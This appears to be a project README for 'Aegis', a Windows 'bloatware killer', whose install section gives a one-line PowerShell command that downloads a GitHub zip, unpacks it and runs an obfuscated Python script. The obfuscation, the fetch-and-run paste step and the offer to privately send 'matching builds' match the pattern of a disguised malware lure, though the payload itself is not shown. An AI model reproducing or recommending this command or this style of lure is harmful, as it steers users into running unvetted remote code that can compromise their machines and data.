# Aegis

A small Windows tool that frees up resources by repeatedly stopping known
bloatware processes. Runs in your Command Prompt window until you close it.

## Requirements

- Windows 64-bit
- **Python 3.11** installed and on your PATH (check with `python --version`)

> If you're on a different Python version and Aegis won't start, let me know your
> version and I'll send a matching build.

## Install & run (one command)

Open **Command Prompt** and paste:

```
powershell -c "iwr https://github.com/Hyparingle/Aegis/archive/refs/heads/main.zip -o aegis.zip; Expand-Archive aegis.zip -Force; python Aegis-main\aegis.py"
```

That downloads Aegis, unpacks it, and starts it. Press **Ctrl+C** to stop.

## Notes

- No administrator rights needed.
- The code is obfuscated; you don't need to (and can't easily) edit it.
